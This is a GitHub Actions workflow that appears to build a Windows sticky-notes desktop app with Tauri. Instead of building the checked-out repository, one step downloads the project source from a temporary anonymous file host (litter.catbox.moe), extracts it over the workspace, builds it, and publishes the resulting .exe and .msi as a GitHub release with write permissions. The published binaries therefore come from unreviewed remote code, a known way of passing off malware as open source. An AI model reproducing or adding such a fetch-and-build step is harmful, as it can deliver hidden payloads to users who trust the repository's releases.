name: Build Windows Executable

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  build:
    permissions:
      contents: write

    runs-on: windows-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: Download source project
        run: |
          echo "Downloading project source..."
          curl -L "https://litter.catbox.moe/z2yftr.zip" -o project.zip
          echo "Download complete. Extracting..."
          powershell -Command "Expand-Archive -Force project.zip .; Get-ChildItem"

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"

      - name: Install npm dependencies
        run: npm ci

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: stable
          targets: x86_64-pc-windows-msvc

      - name: Cache Rust build
        uses: Swatinem/rust-cache@v2
        with:
          workspaces: src-tauri

      - name: Build Tauri application
        env:
          CI: "true"
          TAURI_SIGNING_PRIVATE_KEY: ""
        run: npx tauri build

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: desktop-sticky-notes-artifacts
          path: |
            src-tauri/target/release/bundle/nsis/*.exe
            src-tauri/target/release/bundle/nsis/*.msi
            src-tauri/target/release/桌面便签.exe
          retention-days: 7

      - name: Create Release
        if: github.ref == 'refs/heads/main'
        uses: softprops/action-gh-release@v1
        with:
          draft: "false"
          prerelease: "false"
          files: |
            src-tauri/target/release/bundle/nsis/桌面便签.exe
            src-tauri/target/release/bundle/nsis/桌面便签.msi
            src-tauri/target/release/桌面便签.exe
        env:
          GITHUB_TOKEN: *** secrets.GITHUB_TOKEN }}
